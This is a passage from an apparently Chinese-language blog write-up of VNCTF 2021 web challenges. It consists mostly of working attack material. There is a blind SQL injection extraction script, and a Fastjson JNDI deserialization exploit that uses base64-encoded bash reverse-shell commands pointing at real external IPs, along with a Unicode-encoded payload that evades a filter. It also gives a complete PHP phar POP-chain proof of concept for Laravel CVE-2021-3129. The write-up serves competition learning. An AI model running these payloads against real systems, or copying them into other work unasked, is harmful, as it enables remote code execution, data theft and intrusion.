req(payload % mid) &#x3D;&#x3D; -1:</span><br><span class="line">                    return mid</span><br><span class="line">            return -1</span><br><span class="line">        mid &#x3D; (high + low) &#x2F;&#x2F; 2</span><br><span class="line">        pd &#x3D; payload % mid</span><br><span class="line">        if req(pd) &#x3D;&#x3D; 1:</span><br><span class="line">            low &#x3D; mid + 1</span><br><span class="line">        else:</span><br><span class="line">            high &#x3D; mid</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def version():</span><br><span class="line">    resultstr &#x3D; &quot;&quot;</span><br><span class="line">    for i in range(1, 100):</span><br><span class="line">        payload &#x3D; &quot;-1&#39;and if((ascii(substr(version(),&#123;&#125;,1))&gt;%d),(SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C),0);#&quot;.format(</span><br><span class="line">            i)</span><br><span class="line">        # 1&#39;and&#x2F;**&#x2F;if(ascii(substr(version(),1,1))&gt;64,1,1)like&#x2F;**&#x2F;1#</span><br><span class="line">        j &#x3D; binary_search(payload)</span><br><span class="line">        if j &gt; 10:</span><br><span class="line">            resultstr &#x3D; resultstr + chr(j)</span><br><span class="line">            print(resultstr)</span><br><span class="line">        else:</span><br><span class="line">            break</span><br><span class="line">    resultstr &#x3D; &quot;version&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&gt;&quot; + resultstr</span><br><span class="line">    print(resultstr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def database():</span><br><span class="line">    resultstr &#x3D; &quot;&quot;</span><br><span class="line">    for i in range(1, 100):</span><br><span class="line">        payload &#x3D; &quot;-1&#39;and if((ascii(substr(database(),&#123;&#125;,1))&gt;%d),(SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C),0);#&quot;.format(</span><br><span class="line">            i)</span><br><span class="line">        j &#x3D; binary_search(payload)</span><br><span class="line">        if j &gt; 10:</span><br><span class="line">            resultstr &#x3D; resultstr + chr(j)</span><br><span class="line">            print(resultstr)</span><br><span class="line">        else:</span><br><span class="line">            break</span><br><span class="line">    resultstr &#x3D; &quot;databases&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&gt;&quot; + resultstr</span><br><span class="line">    print(resultstr)</span><br><span class="line"># databases&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&gt;ctf</span><br><span class="line"></span><br><span class="line">def table():</span><br><span class="line">    resultstr &#x3D; &quot;&quot;</span><br><span class="line">    for i in range(1, 10000):</span><br><span class="line">        payload &#x3D; &quot;-1&#39;and if((ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(&#39;ctf&#39;)),&#123;&#125;,1))&gt;%d),(SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C),0);#&quot;.format(</span><br><span class="line">            i)</span><br><span class="line">        j &#x3D; binary_search(payload)</span><br><span class="line">        if j &gt; 10:</span><br><span class="line">            resultstr &#x3D; resultstr + chr(j)</span><br><span class="line">            print(resultstr)</span><br><span class="line">        else:</span><br><span class="line">            break</span><br><span class="line">    resultstr &#x3D; &quot;tables&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&gt;&quot; + resultstr</span><br><span class="line">    print(resultstr)</span><br><span class="line"># tables&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&gt;ctf</span><br><span class="line"></span><br><span class="line">def columns():</span><br><span class="line">    resultstr &#x3D; &quot;&quot;</span><br><span class="line">    for i in range(1, 10000):</span><br><span class="line">        payload &#x3D; &quot; &quot;.format(i) # 孩子没跑了，太卡了</span><br><span class="line">        j &#x3D; binary_search(payload)</span><br><span class="line">        if j &gt; 10:</span><br><span class="line">            resultstr &#x3D; resultstr + chr(j)</span><br><span class="line">            print(resultstr)</span><br><span class="line">        else:</span><br><span class="line">            break</span><br><span class="line">    resultstr &#x3D; &quot;columns&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&gt;&quot; + resultstr</span><br><span class="line">    print(resultstr)</span><br><span class="line"></span><br><span class="line">def data():</span><br><span class="line">    resultstr &#x3D; &quot; &quot;</span><br><span class="line">    for i in range(1, 10000):</span><br><span class="line">        payload &#x3D; &quot;&quot;.format(i) # 孩子没跑了，太卡了</span><br><span class="line">        j &#x3D; binary_search(payload)</span><br><span class="line">        if j &gt; 10:</span><br><span class="line">            resultstr &#x3D; resultstr + chr(j)</span><br><span class="line">            print(resultstr)</span><br><span class="line">        else:</span><br><span class="line">            break</span><br><span class="line">    resultstr &#x3D; &quot;data&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&gt;&quot; + resultstr</span><br><span class="line">    print(resultstr)</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    # version()</span><br><span class="line">    # database()</span><br><span class="line">    table()</span><br><span class="line">    # columns()</span><br><span class="line">    # data()</span><br></pre></td></tr></table></figure>
+
+<p>（慢慢跑吧，很费时间的）</p>
+<p>拿到admin密码后登录进去：</p>
+<p><a target="_blank" rel="noopener" href="https://cdn.jsdelivr.net/gh/MrAnonymous-1/tuchuang/img/20210315184715.png"><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/MrAnonymous-1/tuchuang/img/20210315184715.png" alt="image-20210315184713892"></a></p>
+<p>这个图片可以进行目录穿越：</p>
+<p><a target="_blank" rel="noopener" href="https://cdn.jsdelivr.net/gh/MrAnonymous-1/tuchuang/img/20210315190900.png"><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/MrAnonymous-1/tuchuang/img/20210315190900.png" alt="image-20210315190858849"></a></p>
+<p>但是读不到flag，可能名字不对，读取到了一个 pom.xml 文件：</p>
+<p>抓包成功读取到了一个pom.xml文件：</p>
+<blockquote>
+<p>POM是项目对象模型(Project Object Model)的简称,它是Maven项目中的文件，使用XML表示，名称叫做pom.xml。作用类似ant的build.xml文件，功能更强大。该文件用于管理：源代码、配置文件、开发者的信息和角色、问题追踪系统、组织信息、项目授权、项目的url、项目的依赖关系等等。事实上，在Maven世界中，project可以什么都没有，甚至没有代码，但是必须包含pom.xml文件。</p>
+</blockquote>
+<p><a target="_blank" rel="noopener" href="https://whoamianony.oss-cn-beijing.aliyuncs.com/img/20210317105048.png"><img src= "/img/loading.gif" data-lazy-src="https://whoamianony.oss-cn-beijing.aliyuncs.com/img/20210317105048.png" alt="image-20210316183658473"></a></p>
+<p>发现存在Fastjson，这是是一个 Java 库，可以将 Java 对象转换为 JSON 格式，当然它也可以将 JSON 字符串转换为 Java 对象。并且该Fastjson的版本为1.2.27，该版本的Fastjson存在远程命令执行漏洞。</p>
+<p>我们在创建任务的时候抓包查看，如下图所示，发现创建角色的时候使用的刚好是Json字符串：</p>
+<p><a target="_blank" rel="noopener" href="https://whoamianony.oss-cn-beijing.aliyuncs.com/img/20210317105052.png"><img src= "/img/loading.gif" data-lazy-src="https://whoamianony.oss-cn-beijing.aliyuncs.com/img/20210317105052.png" alt="image-20210316184308404"></a></p>
+<h3 id="fastjson-lt-1-2-68反序列化漏洞"><a href="#fastjson-lt-1-2-68反序列化漏洞" class="headerlink" title="fastjson &lt;1.2.68反序列化漏洞"></a>fastjson &lt;1.2.68反序列化漏洞</h3><p>vps上先开启一个监听：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">BASH</span><br><span class="line">nc -lvvp 2333</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://whoamianony.oss-cn-beijing.aliyuncs.com/img/20210317105056.png"><img src= "/img/loading.gif" data-lazy-src="https://whoamianony.oss-cn-beijing.aliyuncs.com/img/20210317105056.png" alt="image-20210316190331562"></a></p>
+<p>下载 <a target="_blank" rel="noopener" href="https://github.com/welk1n/JNDI-Injection-Exploit">JNDI-Injection-Exploit</a> 工具，执行如下命令搭建ldap服务：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">BASH</span><br><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny4xMDEuNTcuNzIvMjMzMyAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; -A &quot;47.101.57.72&quot;</span><br><span class="line"></span><br><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;bash -c &#123;echo,YmFzaCAtaSAmPi9kZXYvdGNwLzQ3Ljk0LjAuMjUwLzEgPCYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; -A &quot;47.94.0.250&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>-C 后面跟的是反弹shell的命令, 这里不能直接用 <code>bash -i &gt;&amp; /dev/tcp/47.101.57.72/2333 0&gt;&amp;1</code>，因为涉及java反弹shell的编码问题，我门直接去 <a target="_blank" rel="noopener" href="http://www.jackson-t.ca/runtime-exec-payloads.html">这个网站</a> ，将反弹shell的命令编码一下就成功了：</p>
+<p><a target="_blank" rel="noopener" href="https://whoamianony.oss-cn-beijing.aliyuncs.com/img/20210317105101.png"><img src= "/img/loading.gif" data-lazy-src="https://whoamianony.oss-cn-beijing.aliyuncs.com/img/20210317105101.png" alt="image-20210316201957329"></a></p>
+</blockquote>
+<p><a target="_blank" rel="noopener" href="https://whoamianony.oss-cn-beijing.aliyuncs.com/img/20210317105105.png"><img src= "/img/loading.gif" data-lazy-src="https://whoamianony.oss-cn-beijing.aliyuncs.com/img/20210317105105.png" alt="image-20210316202107745"></a></p>
+<p>然后发送如下payload：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CODE</span><br><span class="line">Copy successfullyroleJson&#x3D;&#123;&quot;e&quot;:&#123;&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;&#125;,&quot;name&quot;:&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi:&#x2F;&#x2F;47.101.57.72:1099&#x2F;sx8cow&quot;,&quot;autoCommit&quot;:true&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://whoamianony.oss-cn-beijing.aliyuncs.com/img/20210317105108.png"><img src= "/img/loading.gif" data-lazy-src="https://whoamianony.oss-cn-beijing.aliyuncs.com/img/20210317105108.png" alt="image-20210316202157047"></a></p>
+<p>被检测了，这里我们使用Unicode编码绕过：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CODE</span><br><span class="line">roleJson&#x3D;&#123;&quot;e&quot;:&#123;&quot;\u0040\u0074\u0079\u0070\u0065&quot;:&quot;\u006a\u0061\u0076\u0061\u002e\u006c\u0061\u006e\u0067\u002e\u0043\u006c\u0061\u0073\u0073&quot;,&quot;\u0076\u0061\u006c&quot;:&quot;\u0063\u006f\u006d\u002e\u0073\u0075\u006e\u002e\u0072\u006f\u0077\u0073\u0065\u0074\u002e\u004a\u0064\u0062\u0063\u0052\u006f\u0077\u0053\u0065\u0074\u0049\u006d\u0070\u006c&quot;&#125;,&quot;name&quot;:&#123;&quot;\u0040\u0074\u0079\u0070\u0065&quot;:&quot;\u0063\u006f\u006d\u002e\u0073\u0075\u006e\u002e\u0072\u006f\u0077\u0073\u0065\u0074\u002e\u004a\u0064\u0062\u0063\u0052\u006f\u0077\u0053\u0065\u0074\u0049\u006d\u0070\u006c&quot;,&quot;\u0064\u0061\u0074\u0061\u0053\u006f\u0075\u0072\u0063\u0065\u004e\u0061\u006d\u0065&quot;:&quot;rmi:&#x2F;&#x2F;47.101.57.72:1099&#x2F;sx8cow&quot;,&quot;\u0061\u0075\u0074\u006f\u0043\u006f\u006d\u006d\u0069\u0074&quot;:true&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://whoamianony.oss-cn-beijing.aliyuncs.com/img/20210317105114.png"><img src= "/img/loading.gif" data-lazy-src="https://whoamianony.oss-cn-beijing.aliyuncs.com/img/20210317105114.png" alt="image-20210316202215506"></a></p>
+<p><a target="_blank" rel="noopener" href="https://whoamianony.oss-cn-beijing.aliyuncs.com/img/20210317105118.png"><img src= "/img/loading.gif" data-lazy-src="https://whoamianony.oss-cn-beijing.aliyuncs.com/img/20210317105118.png" alt="image-20210316202337607"></a></p>
+<p>目标服务器加载了恶意的class文件后，成功getshell：</p>
+<p><a target="_blank" rel="noopener" href="https://whoamianony.oss-cn-beijing.aliyuncs.com/img/20210317105121.jpg"><img src= "/img/loading.gif" data-lazy-src="https://whoamianony.oss-cn-beijing.aliyuncs.com/img/20210317105121.jpg" alt="mmexport1615897495003"></a></p>
+<h2 id="VNCTF-2021-Easy-laravel"><a href="#VNCTF-2021-Easy-laravel" class="headerlink" title="[VNCTF 2021]Easy_laravel"></a>[VNCTF 2021]Easy_laravel</h2><p>题目给了附件<a href="http://www.zip.xn--%2Claravel:-4b3oi23mh40cbzzdempjlm/">www.zip。进入题目，laravel报错：</a></p>
+<p><a target="_blank" rel="noopener" href="https://whoamianony.oss-cn-beijing.aliyuncs.com/img/20210317105126.png"><img src= "/img/loading.gif" data-lazy-src="https://whoamianony.oss-cn-beijing.aliyuncs.com/img/20210317105126.png" alt="image-20210315194243164"></a></p>
+<p>需要在浏览器的隐私模式下访问：</p>
+<p><a target="_blank" rel="noopener" href="https://cdn.jsdelivr.net/gh/MrAnonymous-1/tuchuang/img/20210315194306.png"><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/MrAnonymous-1/tuchuang/img/20210315194306.png" alt="image-20210315194304406"></a></p>
+<p>Laravel版本是v8.22.1，再想到前面的报错，应该是Laravel Debug mode RCE（CVE-2021-3129）这个漏洞没跑了，该漏洞详情请看：</p>
+<p>[《Laravel Debug mode RCE（CVE-2021-3129）漏洞复现》](<a target="_blank" rel="noopener" href="https://whoamianony.top/2021/01/15/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Laravel/Laravel">https://whoamianony.top/2021/01/15/漏洞复现/Laravel/Laravel</a> Debug mode RCE（CVE-2021-3129）利用复现/)</p>
+<p>首先检测该漏是否存在：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CODE</span><br><span class="line">POST &#x2F;index.php&#x2F;_ignition&#x2F;execute-solution HTTP&#x2F;1.1</span><br><span class="line">Host: 29b5a1a7-dc40-4755-bf12-5ec1d24d26e8.node3.buuoj.cn</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line">Content-Length: 168</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;solution&quot;: &quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;,</span><br><span class="line">  &quot;parameters&quot;: &#123;</span><br><span class="line">    &quot;variableName&quot;: &quot;username&quot;,</span><br><span class="line">    &quot;viewFile&quot;: &quot;xxxxxxx&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>如下图所示，存在该漏洞：</p>
+<p><a target="_blank" rel="noopener" href="https://whoamianony.oss-cn-beijing.aliyuncs.com/img/20210317105133.png"><img src= "/img/loading.gif" data-lazy-src="https://whoamianony.oss-cn-beijing.aliyuncs.com/img/20210317105133.png" alt="image-20210315194558281"></a></p>
+<p>这个漏洞利用十分简单，但是这里出题人在源码中对一些已公开的pop链做了修改。并且php版本为7.4没有assert、web目录只有session和log目录有写权限。所以，我们需要自己挖一个全新的POP链。看来自己的pop链还是得自己挖……</p>
+<ul>
+<li>\vendor\symfony\routing\Loader\Configurator\ImportConfigurator.php</li>
+</ul>
+<p>ImportConfigurator类中存在 <code>__destruct</code> 方法，可用来调用 <code>__call()</code>：</p>
+<p><a target="_blank" rel="noopener" href="https://whoamianony.oss-cn-beijing.aliyuncs.com/img/20210317105136.png"><img src= "/img/loading.gif" data-lazy-src="https://whoamianony.oss-cn-beijing.aliyuncs.com/img/20210317105136.png" alt="image-20210316203150771"></a></p>
+<ul>
+<li>\vendor\mockery\mockery\library\Mockery\HigherOrderMessage.php</li>
+</ul>
+<p>在HigherOrderMessage类中找到了一个 <code>__call()</code> 方法：</p>
+<p><a target="_blank" rel="noopener" href="https://whoamianony.oss-cn-beijing.aliyuncs.com/img/20210317105141.png"><img src= "/img/loading.gif" data-lazy-src="https://whoamianony.oss-cn-beijing.aliyuncs.com/img/20210317105141.png" alt="image-20210316203230702"></a></p>
+<p>该方法中存在如下代码：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PHP</span><br><span class="line">$expectation &#x3D; $this-&gt;mock-&gt;&#123;$this-&gt;method&#125;($method);</span><br></pre></td></tr></table></figure>
+
+<p>可以用来动态执行php函数，当我们将mock声明为一个对象时，就可以调用任意类中的方法。</p>
+<ul>
+<li>\vendor\phpunit\phpunit\src\Framework\MockObject\MockTrait.php</li>
+</ul>
+<p>在MockTrait类中发现了一个generate()方法，该方法中存在一个eval()函数且参数可控：</p>
+<p><a target="_blank" rel="noopener" href="https://whoamianony.oss-cn-beijing.aliyuncs.com/img/20210317105144.png"><img src= "/img/loading.gif" data-lazy-src="https://whoamianony.oss-cn-beijing.aliyuncs.com/img/20210317105144.png" alt="image-20210316203510254"></a></p>
+<p>最终的POC如下：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PHP</span><br><span class="line">&#x2F;&#x2F; poc.php</span><br><span class="line">&lt;?php</span><br><span class="line">namespace Symfony\Component\Routing\Loader\Configurator&#123;</span><br><span class="line">    class ImportConfigurator&#123;</span><br><span class="line">    	private $parent;</span><br><span class="line">    	private $route;</span><br><span class="line">    	public function __construct($class)&#123;</span><br><span class="line">	    	$this-&gt;parent &#x3D; $class;</span><br><span class="line">		    $this-&gt;route &#x3D; &#39;test&#39;;</span><br><span class="line">	    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace Mockery&#123;</span><br><span class="line">    class HigherOrderMessage&#123;</span><br><span class="line">	    private $mock;</span><br><span class="line">        private $method;</span><br><span class="line">	    public function __construct($class)&#123;</span><br><span class="line">        	$this-&gt;mock &#x3D; $class;</span><br><span class="line">            $this-&gt;method &#x3D; &#39;generate&#39;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace PHPUnit\Framework\MockObject&#123;</span><br><span class="line">    final class MockTrait&#123;</span><br><span class="line">	    private $classCode;</span><br><span class="line">	    private $mockName;</span><br><span class="line">	    public function __construct()&#123;</span><br><span class="line">            $this-&gt;classCode &#x3D; &quot;phpinfo();&quot;;</span><br><span class="line">            $this-&gt;mockName  &#x3D; &#39;123&#39;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace&#123;</span><br><span class="line">    use \Symfony\Component\Routing\Loader\Configurator\ImportConfigurator;</span><br><span class="line">    use \Mockery\HigherOrderMessage;</span><br><span class="line">    use \PHPUnit\Framework\MockObject\MockTrait;</span><br><span class="line">    </span><br><span class="line">    $m &#x3D; new MockTrait();</span><br><span class="line">	$h &#x3D; new HigherOrderMessage($m);</span><br><span class="line">	$i &#x3D; new ImportConfigurator($h);</span><br><span class="line"></span><br><span class="line">	$phar &#x3D; new Phar(&quot;shell.phar&quot;);</span><br><span class="line">	$phar -&gt; startBuffering();</span><br><span class="line">	$phar -&gt; addFromString(&quot;test.txt&quot;,&quot;test&quot;);</span><br><span class="line">	$phar -&gt; setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER();?&gt;&quot;);</span><br><span class="line">	$phar -&gt; setMetadata($i);</span><br><span class="line">	$phar -&gt; stopBuffering();</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>执行poc.php脚本生成shell.phar：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">BASH</span><br><span class="line">php -d &quot;phar.readonly&#x3D;0&quot; poc.php </span><br></pre></td></tr></table></figure>
+
+<p>然后执行如下命令对payload进行编码：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">BASH</span><br><span class="line">cat shell.phar | base64 -w 0 | python -c &quot;import sys;print(&#39;&#39;.join([&#39;&#x3D;&#39; + hex(ord(i))[2:] + &#39;&#x3D;00&#39; for i in sys.stdin.read()]).upper())&quot;</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://whoamianony.oss-cn-beijing.aliyuncs.com/img/20210317105149.png"><img src= "/img/loading.gif" data-lazy-src="https://whoamianony.oss-cn-beijing.aliyuncs.com/img/20210317105149.png" alt="image-20210316205008420"></a></p>
+<p>按照该漏洞的攻击流程进行测试，如下图所示，成功执行了任意代码phpinfo()：</p>
+<p><a target="_blank" rel="noopener" href="https://whoamianony.oss-cn-beijing.aliyuncs.com/img/20210317105152.png"><img src= "/img/loading.gif" data-lazy-src="https://whoamianony.oss-cn-beijing.aliyuncs.com/img/20210317105152.png" alt="image-20210316204233355"></a></p>
+<p><strong>Author:</strong> <a href="mailto:undefined">Mr.Anonymous</a></p>
+<p><strong>Link:</strong> [<a target="_blank" rel="noopener" href="https://whoamianony.top/2021/03/15/CTF%E6%AF%94%E8%B5%9B%E8%AE%B0%E5%BD%95/2021%20VNCTF%20Web%20Writeup/]">https://whoamianony.top/2021/03/15/CTF%E6%AF%94%E8%B5%9B%E8%AE%B0%E5%BD%95/2021%20VNCTF%20Web%20Writeup/]</a>(<a target="_blank" rel="noopener" href="https://whoamianony.top/2021/03/15/CTF%E6%AF%94%E8%B5%9B%E8%AE%B0%E5%BD%95/2021">https://whoamianony.top/2021/03/15/CTF比赛记录/2021</a> VNCTF Web Writeup/)</p>
+<p><strong>Copyright Notice:</strong> All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</p>
+<p><a target="_blank" rel="noopener" href="https://whoamianony.top/tags/CTF/">CTF</a></p>
+<p> Donate</p>
+<p><a target="_blank" rel="noopener" href="https://whoamianony.top/2021/03/15/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E8%87%AA%E5%B7%B1%E6%90%AD%E5%BB%BA%E7%9A%84%E4%B8%89%E5%B1%82%E7%BD%91%E7%BB%9C%E5%9F%9F%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA/"><img src= "/img/loading.gif" data-lazy-src="https://whoamianony.oss-cn-beijing.aliyuncs.com/img/20210317104025.jpg" alt="cover of previous post">PREVIOUS POST自主搭建的三层网络域渗透靶场打靶记录</a></p>
+<p>[<img src= "/img/loading.gif" data-lazy-src="https://whoamianony.oss-cn-beijing.aliyuncs.com/img/20210318153722.jpg" alt="cover of next post">NEXT POSTRedis 攻击方法总结](<a target="_blank" rel="noopener" href="https://whoamianony.top/2021/03/13/Web%E5%AE%89%E5%85%A8/Redis">https://whoamianony.top/2021/03/13/Web安全/Redis</a> 常见攻击方法总结/)</p>
+<p> Related Articles</p>
+<p>[<img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/MrAnonymous-1/tuchuang/img/20201226103410.png" alt="cover"> 2020-12-26DASCTF x BJD 12月圣诞狂欢赛 easyphp（file_get_contents写phar文件并进行phar反序列化）](<a target="_blank" rel="noopener" href="https://whoamianony.top/2020/12/26/CTF%E6%AF%94%E8%B5%9B%E8%AE%B0%E5%BD%95/[DASCTF">https://whoamianony.top/2020/12/26/CTF比赛记录/[DASCTF</a> x BJD 12月圣诞狂欢赛]easyphp（file_get_contents写phar文件并进行phar反序列化）/)</p>
+<p><a target="_blank" rel="noopener" href="https://whoamianony.top/2020/12/21/CTF%E6%AF%94%E8%B5%9B%E8%AE%B0%E5%BD%95/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E2%80%9C%E8%93%9D%E5%B8%BD%E6%9D%AF%E2%80%9D%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%86%B3%E8%B5%9BWriteUp/"><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/MrAnonymous-1/tuchuang/img/20201224200118.png" alt="cover"> 2020-12-21第四届“蓝帽杯”全国大学生网络安全技能大赛决赛WriteUp（Web部分）</a></p>
+<p>[<img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/MrAnonymous-1/tuchuang/img/20210115220936.png" alt="cover"> 2021-01-052020 第一届BMZCTF公开赛-WEB-Writeup](<a target="_blank" rel="noopener" href="https://whoamianony.top/2021/01/05/CTF%E6%AF%94%E8%B5%9B%E8%AE%B0%E5%BD%95/2020">https://whoamianony.top/2021/01/05/CTF比赛记录/2020</a> 第一届BMZCTF公开赛-WEB-Writeup/)</p>
+<p><a target="_blank" rel="noopener" href="https://whoamianony.top/2020/11/26/CTF%E6%AF%94%E8%B5%9B%E8%AE%B0%E5%BD%95/2020%E7%AC%AC%E4%B8%89%E5%B1%8A%E2%80%9C%E5%AE%89%E6%B4%B5%E6%9D%AF%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98%E8%B5%9BWriteUp/"><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/MrAnonymous-1/tuchuang/img/20201125162549.png" alt="cover"> 2020-11-262020第三届“安洵杯”网络安全挑战赛WriteUp</a></p>
+<p><a target="_blank" rel="noopener" href="https://whoamianony.top/2020/11/10/CTF%E6%AF%94%E8%B5%9B%E8%AE%B0%E5%BD%95/%E2%80%9C%E7%A7%91%E6%9D%A5%E6%9D%AF%E2%80%9D%E7%AC%AC%E4%B9%9D%E5%B1%8A%E5%B1%B1%E4%B8%9C%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%86%B3%E8%B5%9B%E9%83%A8%E5%88%86WriteUp/"><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/MrAnonymous-1/tuchuang/img/20201110111850.jpg" alt="cover"> 2020-11-10“科来杯”第九届山东省大学生网络安全技能大赛决赛部分WriteUp</a></p>
+<p>[<img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/MrAnonymous-1/tuchuang/img/20210131201918.jpg" alt="cover"> 2020-10-262020 极客大挑战Web部分WriteUp](<a target="_blank" rel="noopener" href="https://whoamianony.top/2020/10/26/CTF%E6%AF%94%E8%B5%9B%E8%AE%B0%E5%BD%95/2020">https://whoamianony.top/2020/10/26/CTF比赛记录/2020</a> 极客大挑战 WriteUp/)</p>
+<hr>
+<p> Comment</p>
+<p>Submit</p>
+<p>No comment yet.</p>
+<p>Powered By <a target="_blank" rel="noopener" href="https://valine.js.org/">Valine</a><br>v1.4.14</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://whoamianony.top/img/avatar.jpg" alt="avatar"></p>
+<p>Mr.Anonymous</p>
+<p><a target="_blank" rel="noopener" href="https://whoamianony.top/archives/">Articles49</a></p>
+<p><a target="_blank" rel="noopener" href="https://whoamianony.top/tags/">Tags11</a></p>
+<p><a target="_blank" rel="noopener" href="https://whoamianony.top/categories/">Categories11</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/xxxxxx">Follow Me</a></p>
+<p>Announcement</p>
+<p>YOU CAN YOU HACH!</p>
+<p>Catalog</p>
+<ol>
+<li>[1. 前言](<a target="_blank" rel="noopener" href="https://whoamianony.top/2021/03/15/CTF%E6%AF%94%E8%B5%9B%E8%AE%B0%E5%BD%95/2021">https://whoamianony.top/2021/03/15/CTF比赛记录/2021</a> VNCTF Web Writeup/#前言)</li>
+<li>[2. [VNCTF 2021]Ez_game](<a target="_blank" rel="noopener" href="https://whoamianony.top/2021/03/15/CTF%E6%AF%94%E8%B5%9B%E8%AE%B0%E5%BD%95/2021">https://whoamianony.top/2021/03/15/CTF比赛记录/2021</a> VNCTF Web Writeup/#VNCTF-2021-Ez-game)</li>
+<li>\3. [VNCTF 2021]realezjvav<ol>
+<li>[3.1. 基于状态码的盲注](<a target="_blank" rel="noopener" href="https://whoamianony.top/2021/03/15/CTF%E6%AF%94%E8%B5%9B%E8%AE%B0%E5%BD%95/2021">https://whoamianony.top/2021/03/15/CTF比赛记录/2021</a> VNCTF Web Writeup/#基于状态码的盲注)</li>
+<li>[3.2. 笛卡尔积延时注入](<a target="_blank" rel="noopener" href="https://whoamianony.top/2021/03/15/CTF%E6%AF%94%E8%B5%9B%E8%AE%B0%E5%BD%95/2021">https://whoamianony.top/2021/03/15/CTF比赛记录/2021</a> VNCTF Web Writeup/#笛卡尔积延时注入)</li>
